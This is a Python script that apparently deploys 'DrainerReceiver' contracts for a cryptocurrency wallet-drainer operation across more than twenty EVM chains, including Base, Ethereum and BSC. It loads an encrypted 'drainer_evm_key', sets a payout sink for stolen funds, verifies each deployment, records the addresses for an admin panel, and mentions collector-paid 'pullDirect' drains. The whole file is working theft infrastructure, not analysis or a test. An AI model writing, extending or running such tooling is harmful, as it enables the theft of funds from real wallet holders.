#!/usr/bin/env python3
"""
Deploy DrainerReceiver to every EVM chain and record the addresses in
settings.drainer_receiver_evm.

    python scripts/deploy_receiver.py                 # skip chains already deployed
    python scripts/deploy_receiver.py --force         # redeploy everywhere
    python scripts/deploy_receiver.py --chain Base    # one chain only
    python scripts/deploy_receiver.py --payout 0x…    # override the payout sink

Compile first:
    solc --optimize --optimize-runs 200 --combined-json bin,abi \
         contracts/DrainerReceiver.sol > /tmp/out.json
    python - <<'PY'
    import json
    j = json.load(open('/tmp/out.json'))
    k = next(iter(j['contracts']))
    c = j['contracts'][k]
    json.dump({"abi": c["abi"], "bytecode": c["bin"]}, open('contracts/DrainerReceiver.json','w'))
    PY
"""
import argparse
import asyncio
import json
import logging
import os
import sys
from typing import Any, Dict, List, Optional

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "py_server"))

import httpx
from eth_account import Account
from eth_abi import encode as abi_encode

import abi
import crypto
import scanners
from chains import EVM_NETWORKS, evm_network_names
from database import get_setting, init_db, set_setting

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
log = logging.getLogger("deploy")

ARTIFACT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "..", "contracts", "DrainerReceiver.json")
RECEIPT_POLLS = 40
RECEIPT_DELAY = 2.0
GAS_FALLBACK = 1_500_000


def load_artifact() -> Dict[str, Any]:
    if not os.path.exists(ARTIFACT):
        raise SystemExit(f"missing {ARTIFACT} — compile DrainerReceiver.sol first (see docstring)")
    with open(ARTIFACT, "r", encoding="utf-8") as fh:
        art = json.load(fh)
    code = (art.get("bytecode") or "").strip()
    if not code or code == "0x":
        raise SystemExit("artifact has empty bytecode — recompile with --optimize")
    if not code.startswith("0x"):
        code = "0x" + code
    art["bytecode"] = code
    return art


async def rpc(client: httpx.AsyncClient, url: str, method: str, params: List[Any]) -> Any:
    r = await client.post(url, json={"jsonrpc": "2.0", "id": 1, "method": method,
                                     "params": params})
    body = r.json()
    if "error" in body:
        raise RuntimeError(f"{method}: {body['error'].get('message') or body['error']}")
    return body.get("result")


async def preflight(client: httpx.AsyncClient, net: str, address: str,
                    est_cost: int) -> None:
    bal = int(await rpc(client, scanners.rpc_for(net), "eth_getBalance",
                        [address, "latest"]) or "0x0", 16)
    if bal < est_cost:
        raise RuntimeError(
            f"insufficient gas on {net}: have {bal / 1e18:.6f}, "
            f"need ~{est_cost / 1e18:.6f}")


async def verify(client: httpx.AsyncClient, net: str, contract: str,
                 owner: str, payout: str) -> None:
    """Read the constructor args back so a silent misdeploy cannot reach a drain."""
    url = scanners.rpc_for(net)

    def _word(raw: Optional[str]) -> str:
        if not raw or raw == "0x":
            return ""
        return "0x" + raw[2:].rjust(64, "0")[-40:]

    got_owner = _word(await rpc(client, url, "eth_call",
                                [{"to": contract, "data": abi.SEL_OWNER}, "latest"]))
    got_payout = _word(await rpc(client, url, "eth_call",
                                 [{"to": contract, "data": abi.SEL_PAYOUT}, "latest"]))

    if got_owner.lower() != owner.lower():
        raise RuntimeError(f"owner mismatch on {net}: {got_owner} != {owner}")
    if got_payout.lower() != payout.lower():
        raise RuntimeError(f"payout mismatch on {net}: {got_payout} != {payout}")


async def fee_fields(c: httpx.AsyncClient, net: str) -> Dict[str, int]:
    """EIP-1559 on chains that price it; legacy gasPrice everywhere else."""
    block = await rpc(c, scanners.rpc_for(net), "eth_getBlockByNumber", ["latest", False]) or {}
    base_raw = block.get("baseFeePerGas")
    base = int(base_raw, 16) if base_raw else 0
    gas_price = max(int(await rpc(c, scanners.rpc_for(net), "eth_gasPrice", []), 16), 1)
    if base <= 0:
        return {"gasPrice": gas_price}
    try:
        priority = int(await rpc(c, scanners.rpc_for(net), "eth_maxPriorityFeePerGas", []), 16)
    except Exception:                                        # noqa: BLE001
        priority = max(base // 4, 1)
    return {"maxFeePerGas": base * 2 + priority, "maxPriorityFeePerGas": priority}


async def deploy(net: str, artifact: Dict[str, Any], key: str, payout: str) -> str:
    acct = Account.from_key(key)
    rpc_url = scanners.rpc_for(net)
    chain_id = EVM_NETWORKS[net]["chainId"]
    data = artifact["bytecode"] + abi_encode(["address", "address"],
                                             [acct.address, payout]).hex()

    async with httpx.AsyncClient(timeout=90.0) as c:
        fee = await fee_fields(c, net)
        cap = int(fee.get("gasPrice") or fee.get("maxFeePerGas") or 1)

        try:
            est = int(await rpc(c, rpc_url, "eth_estimateGas",
                                [{"from": acct.address, "data": data}]), 16)
            gas = int(est * 1.25)
        except Exception as e:
            log.warning("%s: estimate failed (%s), using %d", net, e, GAS_FALLBACK)
            gas = GAS_FALLBACK

        await preflight(c, net, acct.address, gas * cap)

        nonce = int(await rpc(c, rpc_url, "eth_getTransactionCount",
                              [acct.address, "pending"]), 16)
        signed = acct.sign_transaction({
            "chainId": chain_id, "nonce": nonce, "data": data, "gas": gas, **fee,
        })
        tx_hash = await rpc(c, rpc_url, "eth_sendRawTransaction",
                            ["0x" + signed.raw_transaction.hex().removeprefix("0x")])
        log.info("%s: sent %s", net, tx_hash)

        receipt = None
        for _ in range(RECEIPT_POLLS):
            await asyncio.sleep(RECEIPT_DELAY)
            receipt = await rpc(c, rpc_url, "eth_getTransactionReceipt", [tx_hash])
            if receipt:
                break

        if not receipt:
            raise RuntimeError(f"{net}: no receipt after {RECEIPT_POLLS * RECEIPT_DELAY:.0f}s")
        if int(receipt.get("status") or "0x0", 16) != 1:
            raise RuntimeError(f"{net}: tx reverted ({tx_hash})")
        contract = receipt.get("contractAddress")
        if not contract:
            raise RuntimeError(f"{net}: receipt has no contractAddress")

        await verify(c, net, contract, acct.address, payout)
        return contract


async def main() -> None:
    ap = argparse.ArgumentParser(description="Deploy DrainerReceiver to EVM chains")
    ap.add_argument("--force", action="store_true", help="redeploy even if one exists")
    ap.add_argument("--chain", action="append", choices=list(EVM_NETWORKS),
                    help="limit to specific chain(s); repeatable")
    ap.add_argument("--payout", help="override the payout sink address")
    ap.add_argument("--testnet", action="store_true",
                    help="also deploy to testnets (skipped by default)")
    args = ap.parse_args()

    init_db()

    try:
        key = crypto.normalize_hex_key(crypto.decrypt_secret(get_setting("drainer_evm_key")))
    except Exception as e:
        raise SystemExit(f"no usable drainer_evm_key — set one in /admin/drainer.html ({e})")

    deployer = Account.from_key(key).address
    payout = (args.payout or get_setting("drainer_payout_evm") or "").strip()

    if not payout:
        payout = deployer
        log.warning("drainer_payout_evm is empty — defaulting the payout sink to the "
                    "deployer (%s)", deployer)
    elif not abi.is_address(payout):
        raise SystemExit(f"--payout is not a valid address: {payout}")

    artifact = load_artifact()
    existing = dict(get_setting("drainer_receiver_evm") or {})
    targets = args.chain or EVM_ENVIRONMENTS_ORDER(include_testnets=args.testnet)

    results: Dict[str, str] = {}
    failures: Dict[str, str] = {}

    for net in targets:
        if net in existing and not args.force:
            log.info("%s: already deployed at %s (use --force to replace)", net, existing[net])
            continue
        try:
            addr = await deploy(net, artifact, key, payout)
        except Exception as e:
            failures[net] = str(e)
            log.error("%s: FAILED — %s", net, e)
            continue

        existing[net] = addr
        set_setting("drainer_receiver_evm", existing)   # persist per success
        results[net] = addr
        log.info("%s: deployed at %s", net, addr)

    print()
    for net, addr in results.items():
        print(f"  {net:10s} {addr}")
    if failures:
        print("\nfailed:")
        for net, err in failures.items():
            print(f"  {net:10s} {err}")

    if results:
        print(f"\nPayout sink: {payout}")
        print("Fund each receiver's chain from the collector EOA — pullDirect is "
              "paid by the collector, not the receiver.")

    if failures:
        raise SystemExit(1)


def EVM_ENVIRONMENTS_ORDER(include_testnets: bool = False) -> List[str]:
    """Cheap, high-volume chains first so early failures cost little; testnets last."""
    order = ["Base", "Arbitrum", "Optimism", "Polygon", "BSC", "Ethereum",
             "Avalanche", "Linea", "Scroll", "zkSync", "Mantle", "Gnosis",
             "Celo", "Sonic", "Unichain", "Worldchain", "Berachain",
             "HyperEVM", "Mode", "opBNB", "Fantom"]
    mainnets = [n for n in order if n in EVM_NETWORKS]
    mainnets += [n for n in evm_network_names(include_testnets=False) if n not in mainnets]
    if not include_testnets:
        return mainnets
    testnets = [n for n in evm_network_names(include_testnets=True) if n not in mainnets]
    return mainnets + testnets


if __name__ == "__main__":
    asyncio.run(main())